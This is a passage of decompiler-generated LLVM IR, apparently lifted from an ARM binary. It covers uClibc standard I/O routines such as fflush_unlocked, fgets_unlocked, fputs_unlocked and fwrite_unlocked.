  %v0_11598 = load i32, i32* %r6.global-to-local, align 4
  %v2_11598 = add i32 %v0_11598, 52
  %v3_11598 = inttoptr i32 %v2_11598 to i32*
  %v4_11598 = load i32, i32* %v3_11598, align 4
  store i32 %v4_11598, i32* %r3.global-to-local, align 4
  %v0_1159c = load i32, i32* %r4.global-to-local, align 4
  %v2_1159c = inttoptr i32 %v4_11598 to i32*
  store i32 %v0_1159c, i32* %v2_1159c, align 4
  %v0_115a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %entry, %dec_label_pc_114e0, %dec_label_pc_1157c
  %v0_115a4 = phi i32 [ %v0_114d0, %entry ], [ %v0_114d0, %dec_label_pc_114e0 ], [ %v0_115a4.pre, %dec_label_pc_1157c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_115a4 = add i32 %v0_115a4, 12
  %v3_115a4 = inttoptr i32 %v2_115a4 to i32*
  %v4_115a4 = load i32, i32* %v3_115a4, align 4
  %v1_115a8 = inttoptr i32 %v4_115a4 to i32*
  %v2_115a8 = load i32, i32* %v1_115a8, align 4
  %v1_115ac = add i32 %v2_115a8, -1
  store i32 %v1_115ac, i32* %v1_115a8, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_115c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_115c0 = add i32 %v0_115c0, 24
  %v3_115c0 = inttoptr i32 %v2_115c0 to i32*
  %v4_115c0 = load i32, i32* %v3_115c0, align 4
  store i32 %v4_115c0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_115c0)
  %v2_115d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_115d0, i32* %r4.global-to-local, align 4
  ret i32 %v2_114ac

; uselistorder directives
  uselistorder i32 %v0_1156c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_115a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1156c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_11534, { 1, 0 }
}

define i32 @function_115dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_115dc:
  %v0_115dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115dc, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_115dc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_115dc, %bb
  %v10_11600 = phi i32 [ %arg1, %dec_label_pc_115dc ], [ 0, %bb ]
  ret i32 %v10_11600

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %sb.global-to-local, align 4
  %v4_11614 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 48) to i32*), align 4
  store i32 %v4_11614, i32* %r3.global-to-local, align 4
  %v10_11618 = icmp eq i32 %tmp, %v4_11614
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_11618, label %bb, label %dec_label_pc_11630

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11640

dec_label_pc_11630:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_11634 = icmp eq i16* %arg1, null
  br i1 %v2_11634, label %dec_label_pc_11640, label %dec_label_pc_117a8

dec_label_pc_11640:                               ; preds = %bb, %dec_label_pc_11630
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_11630 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_11654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_11660 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_11654, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11660)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11684 = load i32, i32* %sb.global-to-local, align 4
  %v2_11684 = add i32 %v0_11684, 16
  %v3_11684 = inttoptr i32 %v2_11684 to i32*
  %v4_11684 = load i32, i32* %v3_11684, align 4
  call void @__pseudo_branch(i32 %v4_11684)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11694 = add i32 %v0_11684, 12
  %v3_11694 = inttoptr i32 %v2_11694 to i32*
  %v4_11694 = load i32, i32* %v3_11694, align 4
  store i32 %v4_11694, i32* %r2.global-to-local, align 4
  %v1_11698 = inttoptr i32 %v4_11694 to i32*
  %v2_11698 = load i32, i32* %v1_11698, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_116a0 = add i32 %v2_11698, 1
  store i32 %v1_116a0, i32* %r3.global-to-local, align 4
  %v2_116a4 = add i32 %v0_11684, 24
  %v3_116a4 = inttoptr i32 %v2_116a4 to i32*
  %v4_116a4 = load i32, i32* %v3_116a4, align 4
  store i32 %v1_116a0, i32* %v1_11698, align 4
  call void @__pseudo_branch(i32 %v4_116a4)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_116c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_116c0 = add i32 %v0_116c0, 100
  %v3_116c0 = inttoptr i32 %v2_116c0 to i32*
  %v4_116c0 = load i32, i32* %v3_116c0, align 4
  store i32 %v4_116c0, i32* @r4, align 4
  store i32 %v4_116c0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11660)
  call void @__pseudo_branch(i32 %v4_11684)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_116e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_116e8 = add i32 %v0_116e8, 48
  %v3_116e8 = inttoptr i32 %v2_116e8 to i32*
  %v4_116e8 = load i32, i32* %v3_116e8, align 4
  store i32 %v4_116e8, i32* %r3.global-to-local, align 4
  %v1_116f4 = inttoptr i32 %v4_116e8 to i32*
  %v2_116f4 = load i32, i32* %v1_116f4, align 4
  store i32 %v2_116f4, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_116a4)
  %v0_11700 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11700, i32* @r6, align 4
  %v2_11704 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_11704, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_11798.pr = load i32, i32* @r7, align 4
  %v2_1179820 = icmp eq i32 %v0_11798.pr, 0
  br i1 %v2_1179820, label %dec_label_pc_117a0, label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %dec_label_pc_11640, %dec_label_pc_11794
  %v0_11718 = phi i32 [ %v3_11794, %dec_label_pc_11794 ], [ %v0_11798.pr, %dec_label_pc_11640 ]
  %v1_1170c = inttoptr i32 %v0_11718 to i16*
  %v2_1170c = load i16, i16* %v1_1170c, align 2
  %v3_1170c = zext i16 %v2_1170c to i32
  store i32 %v3_1170c, i32* %r3.global-to-local, align 4
  %v1_11710 = and i32 %v3_1170c, 64
  %v2_11710 = icmp eq i32 %v1_11710, 0
  br i1 %v2_11710, label %dec_label_pc_11794, label %dec_label_pc_11718

dec_label_pc_11718:                               ; preds = %dec_label_pc_1170c
  %v1_11718 = add i32 %v0_11718, 56
  store i32 %v1_11718, i32* @r4, align 4
  store i32 %v1_11718, i32* %r2.global-to-local, align 4
  %v0_11728 = load i32, i32* %sb.global-to-local, align 4
  %v1_11728 = load i32, i32* %fp.global-to-local, align 4
  %v2_11728 = add i32 %v1_11728, %v0_11728
  %v3_11728 = inttoptr i32 %v2_11728 to i32*
  %v4_11728 = load i32, i32* %v3_11728, align 4
  call void @__pseudo_branch(i32 %v4_11728)
  %v1_11738 = load i32, i32* @r8, align 4
  %v2_11738 = add i32 %v1_11738, %v0_11728
  %v3_11738 = inttoptr i32 %v2_11738 to i32*
  %v4_11738 = load i32, i32* %v3_11738, align 4
  call void @__pseudo_branch(i32 %v4_11738)
  %v0_11744 = load i32, i32* @r7, align 4
  %v1_11744 = inttoptr i32 %v0_11744 to i16*
  %v2_11744 = load i16, i16* %v1_11744, align 2
  %v3_11744 = zext i16 %v2_11744 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1174c = or i32 %v3_11744, %stack_var_-60.1.in
  %v1_11750 = xor i32 %v2_1174c, 320
  store i32 %v1_11750, i32* %r3.global-to-local, align 4
  %v1_11754 = and i32 %v1_11750, 832
  %v2_11754 = icmp eq i32 %v1_11754, 0
  br i1 %v2_11754, label %dec_label_pc_1175c, label %bb39

dec_label_pc_1175c:                               ; preds = %dec_label_pc_11718
  store i32 %v0_11744, i32* @r0, align 4
  %v0_11760 = call i32 @__stdio_wcommit()
  %v2_11764 = icmp eq i32 %v0_11760, 0
  br i1 %v2_11764, label %.thread8, label %.thread9

.thread8:                                         ; preds = %dec_label_pc_1175c
  %v1_11768 = load i32, i32* @r7, align 4
  %v2_11768 = inttoptr i32 %v1_11768 to i16*
  %v3_11768 = load i16, i16* %v2_11768, align 2
  %v4_11768 = zext i16 %v3_11768 to i32
  store i32 %v4_11768, i32* %r3.global-to-local, align 4
  %v2_1176c = add i32 %v1_11768, 8
  %v3_1176c = inttoptr i32 %v2_1176c to i32*
  %v4_1176c = load i32, i32* %v3_1176c, align 4
  store i32 %v4_1176c, i32* %r2.global-to-local, align 4
  %v2_11770 = and i32 %v4_11768, 65471
  store i32 %v2_11770, i32* %r3.global-to-local, align 4
  %v3_11774 = add i32 %v1_11768, 28
  %v4_11774 = inttoptr i32 %v3_11774 to i32*
  store i32 %v4_1176c, i32* %v4_11774, align 4
  %v1_11778 = load i32, i32* %r3.global-to-local, align 4
  %v2_11778 = trunc i32 %v1_11778 to i16
  %v3_11778 = load i32, i32* @r7, align 4
  %v4_11778 = inttoptr i32 %v3_11778 to i16*
  store i16 %v2_11778, i16* %v4_11778, align 2
  br label %bb39

.thread9:                                         ; preds = %dec_label_pc_1175c
  store i32 -1, i32* @r6, align 4
  br label %bb39

bb39:                                             ; preds = %.thread8, %dec_label_pc_11718, %.thread9
  %v0_11788 = load i32, i32* %sb.global-to-local, align 4
  %v1_11788 = load i32, i32* %sl.global-to-local, align 4
  %v2_11788 = add i32 %v1_11788, %v0_11788
  %v3_11788 = inttoptr i32 %v2_11788 to i32*
  %v4_11788 = load i32, i32* %v3_11788, align 4
  call void @__pseudo_branch(i32 %v4_11788)
  %v0_11794.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_1170c, %bb39
  %v0_11794 = phi i32 [ %v0_11718, %dec_label_pc_1170c ], [ %v0_11794.pre, %bb39 ]
  %v1_11794 = add i32 %v0_11794, 32
  %v2_11794 = inttoptr i32 %v1_11794 to i32*
  %v3_11794 = load i32, i32* %v2_11794, align 4
  store i32 %v3_11794, i32* @r7, align 4
  %v2_11798 = icmp eq i32 %v3_11794, 0
  br i1 %v2_11798, label %dec_label_pc_117a0, label %dec_label_pc_1170c

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11794, %dec_label_pc_11640
  %v0_117a0 = call i32 @_stdio_openlist_dec_use()
  %v0_117dc.pre = load i32, i32* @r6, align 4
  br label %bb41

dec_label_pc_117a8:                               ; preds = %dec_label_pc_11630
  %v2_117a8 = load i16, i16* %arg1, align 2
  %v3_117a8 = zext i16 %v2_117a8 to i32
  %v1_117ac = and i32 %v3_117a8, 64
  store i32 %v1_117ac, i32* %r3.global-to-local, align 4
  %v2_117ac = icmp eq i32 %v1_117ac, 0
  br i1 %v2_117ac, label %bb40, label %dec_label_pc_117b8

bb40:                                             ; preds = %dec_label_pc_117a8
  br label %bb41

dec_label_pc_117b8:                               ; preds = %dec_label_pc_117a8
  %v0_117b8 = call i32 @__stdio_wcommit()
  %v2_117bc = icmp eq i32 %v0_117b8, 0
  br i1 %v2_117bc, label %.thread16, label %.thread18

.thread18:                                        ; preds = %dec_label_pc_117b8
  br label %bb41

.thread16:                                        ; preds = %dec_label_pc_117b8
  %v1_117c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_117c0 = inttoptr i32 %v1_117c0 to i16*
  %v3_117c0 = load i16, i16* %v2_117c0, align 2
  %v4_117c0 = zext i16 %v3_117c0 to i32
  store i32 %v4_117c0, i32* %r3.global-to-local, align 4
  %v2_117c4 = add i32 %v1_117c0, 8
  %v3_117c4 = inttoptr i32 %v2_117c4 to i32*
  %v4_117c4 = load i32, i32* %v3_117c4, align 4
  store i32 %v4_117c4, i32* %r2.global-to-local, align 4
  %v2_117c8 = and i32 %v4_117c0, 65471
  store i32 %v2_117c8, i32* %r3.global-to-local, align 4
  %v2_117cc = trunc i32 %v2_117c8 to i16
  store i16 %v2_117cc, i16* %v2_117c0, align 2
  %v1_117d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_117d0 = load i32, i32* %fp.global-to-local, align 4
  %v3_117d0 = add i32 %v2_117d0, 28
  %v4_117d0 = inttoptr i32 %v3_117d0 to i32*
  store i32 %v1_117d0, i32* %v4_117d0, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread18, %dec_label_pc_117a0, %.thread16
  %v0_117dc = phi i32 [ -1, %.thread18 ], [ 0, %bb40 ], [ %v0_117dc.pre, %dec_label_pc_117a0 ], [ 0, %.thread16 ]
  ret i32 %v0_117dc

; uselistorder directives
  uselistorder i32 %v3_11794, { 1, 2, 0 }
  uselistorder i32 %v0_11684, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb41, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11794, { 1, 0 }
  uselistorder label %bb39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1170c, { 1, 0 }
  uselistorder label %dec_label_pc_11640, { 1, 0 }
}

define i32 @function_117f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_117f0:
  %v0_117f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_117f0, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_117f0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_117f0, %bb
  %v5_1180c = phi i32 [ %arg1, %dec_label_pc_117f0 ], [ 0, %bb ]
  ret i32 %v5_1180c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_11810 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11814 = icmp eq i32 %arg2, 0
  store i1 %v2_11814, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1189c, label %dec_label_pc_11884.preheader

dec_label_pc_11884.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_118842 = add i32 %arg2, -1
  store i32 %v1_118842, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_118848 = icmp eq i32 %arg2, 1
  store i1 %v7_118848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118848, label %dec_label_pc_1188c, label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_11884.preheader, %dec_label_pc_11884.backedge.dec_label_pc_11830_crit_edge
  %v0_11854 = phi i32 [ %v0_11830.pre, %dec_label_pc_11884.backedge.dec_label_pc_11830_crit_edge ], [ %arg3, %dec_label_pc_11884.preheader ]
  %v1_11830 = add i32 %v0_11854, 16
  %v2_11830 = inttoptr i32 %v1_11830 to i32*
  %v3_11830 = load i32, i32* %v2_11830, align 4
  store i32 %v3_11830, i32* %r2.global-to-local, align 4
  %v1_11834 = add i32 %v0_11854, 24
  %v2_11834 = inttoptr i32 %v1_11834 to i32*
  %v3_11834 = load i32, i32* %v2_11834, align 4
  store i32 %v3_11834, i32* %r3.global-to-local, align 4
  %v3_11838 = icmp uge i32 %v3_11830, %v3_11834
  store i1 %v3_11838, i1* %cpsr_c.global-to-local, align 1
  %v9_11838 = icmp eq i32 %v3_11830, %v3_11834
  store i1 %v9_11838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11838, label %dec_label_pc_11854, label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %dec_label_pc_11830
  %v1_11840 = inttoptr i32 %v3_11830 to i8*
  %v2_11840 = load i8, i8* %v1_11840, align 1
  %v3_11840 = zext i8 %v2_11840 to i32
  store i32 %v3_11840, i32* %r3.global-to-local, align 4
  %v5_11840 = add i32 %v3_11830, 1
  store i32 %v5_11840, i32* %r2.global-to-local, align 4
  %v2_11844 = load i32, i32* @r5, align 4
  %v3_11844 = inttoptr i32 %v2_11844 to i8*
  store i8 %v2_11840, i8* %v3_11844, align 1
  %v4_11844 = load i32, i32* @r5, align 4
  %v5_11844 = add i32 %v4_11844, 1
  store i32 %v5_11844, i32* @r5, align 4
  %v0_11848 = load i32, i32* %r3.global-to-local, align 4
  %v2_11848 = icmp ugt i32 %v0_11848, 9
  store i1 %v2_11848, i1* %cpsr_c.global-to-local, align 1
  %v7_11848 = icmp eq i32 %v0_11848, 10
  store i1 %v7_11848, i1* %cpsr_z.global-to-local, align 1
  %v0_1184c = load i32, i32* %r2.global-to-local, align 4
  %v1_1184c = load i32, i32* @r4, align 4
  %v2_1184c = add i32 %v1_1184c, 16
  %v3_1184c = inttoptr i32 %v2_1184c to i32*
  store i32 %v0_1184c, i32* %v3_1184c, align 4
  br i1 %v7_11848, label %dec_label_pc_1188c, label %dec_label_pc_11884.backedge

dec_label_pc_11854:                               ; preds = %dec_label_pc_11830
  %v1_11854 = inttoptr i32 %v0_11854 to i16*
  %v3_11858 = call i32 @getc_unlocked(i16* %v1_11854)
  %v3_1185c = icmp eq i32 %v3_11858, -1
  store i1 %v3_1185c, i1* %cpsr_c.global-to-local, align 1
  %v8_1185c = icmp eq i32 %v3_11858, -1
  store i1 %v8_1185c, i1* %cpsr_z.global-to-local, align 1
  %v1_11860 = urem i32 %v3_11858, 256
  store i32 %v1_11860, i32* %r3.global-to-local, align 4
  br i1 %v3_1185c, label %dec_label_pc_11868, label %dec_label_pc_11880

dec_label_pc_11868:                               ; preds = %dec_label_pc_11854
  %v0_11868 = load i32, i32* @r4, align 4
  %v1_11868 = inttoptr i32 %v0_11868 to i16*
  %v2_11868 = load i16, i16* %v1_11868, align 2
  %v3_11868 = zext i16 %v2_11868 to i32
  store i32 %v3_11868, i32* %r3.global-to-local, align 4
  %v1_1186c = and i32 %v3_11868, 8
  %v2_1186c = icmp eq i32 %v1_1186c, 0
  store i1 %v2_1186c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1186c, label %dec_label_pc_1188c, label %dec_label_pc_1189c

dec_label_pc_11880:                               ; preds = %dec_label_pc_11854
  %v1_11878 = trunc i32 %v3_11858 to i8
  %v2_11878 = load i32, i32* @r5, align 4
  %v3_11878 = inttoptr i32 %v2_11878 to i8*
  store i8 %v1_11878, i8* %v3_11878, align 1
  %v4_11878 = load i32, i32* @r5, align 4
  %v5_11878 = add i32 %v4_11878, 1
  store i32 %v5_11878, i32* @r5, align 4
  %v0_1187c = load i32, i32* %r3.global-to-local, align 4
  %v2_1187c = icmp ugt i32 %v0_1187c, 9
  store i1 %v2_1187c, i1* %cpsr_c.global-to-local, align 1
  %v7_1187c = icmp eq i32 %v0_1187c, 10
  store i1 %v7_1187c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1187c, label %dec_label_pc_1188c, label %dec_label_pc_11884.backedge

dec_label_pc_11884.backedge:                      ; preds = %dec_label_pc_11880, %dec_label_pc_11840
  %v0_11884 = load i32, i32* %r6.global-to-local, align 4
  %v1_11884 = add i32 %v0_11884, -1
  store i32 %v1_11884, i32* %r6.global-to-local, align 4
  %v2_11884 = icmp ne i32 %v0_11884, 0
  store i1 %v2_11884, i1* %cpsr_c.global-to-local, align 1
  %v7_11884 = icmp eq i32 %v0_11884, 1
  store i1 %v7_11884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11884, label %dec_label_pc_1188c, label %dec_label_pc_11884.backedge.dec_label_pc_11830_crit_edge

dec_label_pc_11884.backedge.dec_label_pc_11830_crit_edge: ; preds = %dec_label_pc_11884.backedge
  %v0_11830.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11830

dec_label_pc_1188c:                               ; preds = %dec_label_pc_11880, %dec_label_pc_11884.backedge, %dec_label_pc_11840, %dec_label_pc_11884.preheader, %dec_label_pc_11868
  %v0_1188c = load i32, i32* @r5, align 4
  %v1_1188c = load i32, i32* @r7, align 4
  %v3_1188c = icmp uge i32 %v0_1188c, %v1_1188c
  store i1 %v3_1188c, i1* %cpsr_c.global-to-local, align 1
  %v9_1188c = icmp eq i32 %v0_1188c, %v1_1188c
  store i1 %v9_1188c, i1* %cpsr_z.global-to-local, align 1
  %v2_11890 = xor i1 %v9_1188c, true
  %v3_11890 = and i1 %v3_1188c, %v2_11890
  br i1 %v3_11890, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1188c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_11894 = inttoptr i32 %v0_1188c to i8*
  store i8 0, i8* %v7_11894, align 1
  %v0_11898.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11898.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1188c, %bb
  %v1_11898 = phi i1 [ %v1_11898.pre, %bb ], [ %v9_1188c, %dec_label_pc_1188c ]
  %v0_11898 = phi i1 [ %v0_11898.pre, %bb ], [ %v3_1188c, %dec_label_pc_1188c ]
  %v2_11898 = xor i1 %v1_11898, true
  %v3_11898 = and i1 %v0_11898, %v2_11898
  br i1 %v3_11898, label %.dec_label_pc_118a0_crit_edge, label %dec_label_pc_1189c

.dec_label_pc_118a0_crit_edge:                    ; preds = %.thread14
  %v0_118a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_118a0

dec_label_pc_1189c:                               ; preds = %entry, %dec_label_pc_11868, %.thread14
  br label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %.dec_label_pc_118a0_crit_edge, %dec_label_pc_1189c
  %v0_118a0 = phi i32 [ %v0_118a0.pre, %.dec_label_pc_118a0_crit_edge ], [ 0, %dec_label_pc_1189c ]
  store i32 %v6_11810, i32* @r5, align 4
  ret i32 %v0_118a0

; uselistorder directives
  uselistorder i1 %v9_1188c, { 1, 0, 2 }
  uselistorder i32 %v1_1188c, { 1, 0 }
  uselistorder i32 %v0_1188c, { 0, 2, 1 }
  uselistorder i32 %v0_11884, { 2, 0, 1 }
  uselistorder i32 %v0_1187c, { 1, 0 }
  uselistorder i32 %v3_11858, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11848, { 1, 0 }
  uselistorder i32 %v3_11830, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_11854, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_118a0, { 1, 0 }
  uselistorder label %dec_label_pc_1189c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1188c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_11830, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_118b0 = load i32, i32* @r4, align 4
  store i32 %v3_118b0, i32* %stack_var_-16, align 4
  %v6_118b0 = load i32, i32* @r5, align 4
  %v9_118b0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_118bc = call i32 @strlen(i8* %arg1)
  store i32 %v3_118bc, i32* @r6, align 4
  %v0_118c4 = load i32, i32* @r5, align 4
  %v0_118c8 = load i32, i32* @r4, align 4
  %v5_118d4 = inttoptr i32 %v0_118c4 to i16*
  %v6_118d4 = call i32 @__GI_fwrite_unlocked(i32 %v0_118c8, i32 1, i32 %v3_118bc, i16* %v5_118d4)
  %v1_118d8 = load i32, i32* @r6, align 4
  %v9_118d8 = icmp eq i32 %v6_118d4, %v1_118d8
  br i1 %v9_118d8, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_118e4 = phi i32 [ %v6_118d4, %entry ], [ -1, %bb ]
  %v2_118e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_118e0, i32* @r4, align 4
  store i32 %v6_118b0, i32* @r5, align 4
  store i32 %v9_118b0, i32* @r6, align 4
  ret i32 %v1_118e4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_118e8 = load i32, i32* @r6, align 4
  %v12_118e8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_118f0 = load i16, i16* %arg4, align 2
  %v1_118f4 = and i16 %v3_118f0, 192
  %v2_118f8 = icmp eq i16 %v1_118f4, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_118f8, label %dec_label_pc_11924, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %entry
  %v4_11918 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_1191c = icmp eq i32 %v4_11918, 0
  br i1 %v2_1191c, label %dec_label_pc_11924thread-pre-split, label %dec_label_pc_11984

dec_label_pc_11924thread-pre-split:               ; preds = %dec_label_pc_11910
  %v0_11924.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_11924

dec_label_pc_11924:                               ; preds = %dec_label_pc_11924thread-pre-split, %entry
  %v0_11948 = phi i32 [ %v0_11924.pr, %dec_label_pc_11924thread-pre-split ], [ %arg2, %entry ]
  %v2_11924 = icmp eq i32 %v0_11948, 0
  br i1 %v2_11924, label %dec_label_pc_11984, label %bb

bb:                                               ; preds = %dec_label_pc_11924
  %v1_11928 = load i32, i32* @r6, align 4
  %v3_11928 = icmp eq i32 %v1_11928, 0
  br i1 %v3_11928, label %dec_label_pc_11984, label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %bb
  %v2_11938 = udiv i32 -1, %v0_11948
  %tmp9 = icmp ugt i32 %v1_11928, %v2_11938
  %v0_11964 = load i32, i32* @r5, align 4
  %v1_11964 = inttoptr i32 %v0_11964 to i16*
  br i1 %tmp9, label %dec_label_pc_11964, label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_11930
  store i32 %v0_11964, i32* %r2.global-to-local, align 4
  %v2_11948 = mul i32 %v1_11928, %v0_11948
  %v0_1194c = load i32, i32* @r7, align 4
  %v5_11950 = call i32 @__stdio_fwrite(i32 %v0_1194c, i32 %v2_11948, i16* %v1_11964)
  %v0_11954 = load i32, i32* @r4, align 4
  %v2_11958 = udiv i32 %v5_11950, %v0_11954
  store i32 %v2_11958, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11988

dec_label_pc_11964:                               ; preds = %dec_label_pc_11930
  %v2_11964 = load i16, i16* %v1_11964, align 2
  %v1_11968 = or i16 %v2_11964, 8
